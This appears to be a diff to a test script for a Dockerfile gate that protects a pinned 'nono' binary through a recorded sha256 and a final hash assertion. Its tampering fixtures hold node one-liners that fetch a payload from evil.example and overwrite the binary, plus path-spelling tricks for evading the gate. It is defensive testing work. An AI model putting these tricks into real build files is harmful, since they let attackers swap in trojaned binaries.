@@ -30,7 +30,8 @@ commit=bc1406e9ceb0b765d303a015502fade11f3858f5
 EOF
 }
 
-# The known-good nono stage, reused by the tampering fixtures.
+# The known-good nono stage, reused by the tampering fixtures. It records the
+# sha256 of the binary it built at the asserted commit (rule 8's baseline).
 good_stage() {
   cat <<'EOF'
 FROM rust:bookworm AS nono-builder
@@ -42,7 +43,23 @@ RUN set -eux; \
     test "$(git -C /tmp/nono rev-parse HEAD)" = "${commit}"; \
     cd /tmp/nono; \
     cargo build --release -p nono-cli; \
-    cp target/release/nono /usr/local/bin/nono
+    cp target/release/nono /usr/local/bin/nono; \
+    sha256sum target/release/nono | cut -d' ' -f1 > /nono.sha256
+EOF
+}
+
+# The known-good runtime stage: the pinned COPY for the binary, the pinned hash,
+# and the artifact assertion as the LAST instruction — rule 8's positive
+# invariant. Any base stage that does not end this way is refused.
+good_base() {
+  cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
+RUN groupadd -r tps && useradd -r -g tps -m -s /bin/bash tps
+COPY docker/tps-office-supervisor.sh /usr/local/bin/tps-office-supervisor
+ENTRYPOINT ["tps-office-supervisor"]
+RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 }
 
@@ -208,9 +225,12 @@ RUN set -eux; \
     test "$(git -C /tmp/nono rev-parse HEAD)" = "${commit}"; \
     cd /tmp/nono; \
     cargo build --release -p nono-cli; \
-    cp target/release/nono /usr/local/bin/nono
+    cp target/release/nono /usr/local/bin/nono; \
+    sha256sum target/release/nono | cut -d' ' -f1 > /nono.sha256
 FROM node:24-bookworm-slim@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb AS base
 COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
+RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 run_case "digest-pinned-control" pass "$d"
 
@@ -262,10 +282,95 @@ d="$(mk run-mount-pinned-control)"; good_pin "$d"
 { good_stage; cat <<'EOF'
 FROM node:24-bookworm-slim AS base
 COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
 RUN --mount=type=bind,from=nono-builder,target=/m true
+RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
 EOF
 } >"$d/docker/Dockerfile"
 run_case "run-mount-pinned-control" pass "$d"
+
+# ── 19. Variable-directory rewrite of the shipped path (Sherlock round 5) ────
+# The `mv` target is `$d/nono`, so no literal path is spelled and rule 7 cannot
+# see it. The gate refuses the stage because it does not END with the artifact
+# assertion — and if it did, the assertion would fail the BUILD (fixture 25).
+d="$(mk var-dir-mv)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+RUN node -e 'require("https").get("https://evil.example/payload",r=>r.pipe(require("fs").createWriteStream("/tmp/b")))'
+RUN d=/usr/local/bin; mv /tmp/b $d/nono
+EOF
+} >"$d/docker/Dockerfile"
+run_case "var-dir-mv" fail "$d"
+
+# ── 20. Double-slash spelling of the shipped path ───────────────────────────
+d="$(mk slash-path-write)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
+RUN mv /tmp/x /usr/local//bin/nono
+RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+EOF
+} >"$d/docker/Dockerfile"
+run_case "slash-path-write" fail "$d"
+
+# ── 21. `/./` component spelling of the shipped path ─────────────────────────
+d="$(mk dotslash-path-write)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
+RUN mv /tmp/x /usr/local/bin/./nono
+RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+EOF
+} >"$d/docker/Dockerfile"
+run_case "dotslash-path-write" fail "$d"
+
+# ── 22. Quoted operand spelling of the shipped path ──────────────────────────
+d="$(mk quoted-path-write)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
+RUN ln -sf /tmp/x /usr/local/bin/"nono"
+RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+EOF
+} >"$d/docker/Dockerfile"
+run_case "quoted-path-write" fail "$d"
+
+# ── 23. Split-quote spelling of the shipped path ────────────────────────────
+d="$(mk split-quote-path-write)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
+RUN ln -sf /tmp/x /usr/local/bin/"non"o
+RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+EOF
+} >"$d/docker/Dockerfile"
+run_case "split-quote-path-write" fail "$d"
+
+# ── 24. node as the fetcher (base image is node — always present) ───────────
+# Rule 7's primitive list does not name node; the path whitelist in rule 8 does,
+# because a fetcher that writes the shipped path must still spell it.
+d="$(mk node-fetcher-path-write)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
+RUN node -e 'require("https").get("https://evil.example/p",r=>r.pipe(require("fs").createWriteStream("/usr/local/bin/nono")))'
+RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
+EOF
+} >"$d/docker/Dockerfile"
+run_case "node-fetcher-path-write" fail "$d"
+
+# ── 25. Positive: the artifact-assertion shape must pass ────────────────────
+# Proves rule 8 is the whitelist it claims: pinned COPY + recorded hash +
+# assertion last. (The real tree is the stronger positive control above.)
+d="$(mk sha256-assertion-control)"; good_pin "$d"
+{ good_stage; good_base; } >"$d/docker/Dockerfile"
+run_case "sha256-assertion-control" pass "$d"
 
 # ── Regression guard: the CI workflow must still invoke the gate ─────────────
 if grep -qF './scripts/check-nono-pin.sh' "$repo_root/.github/workflows/test.yml"; then
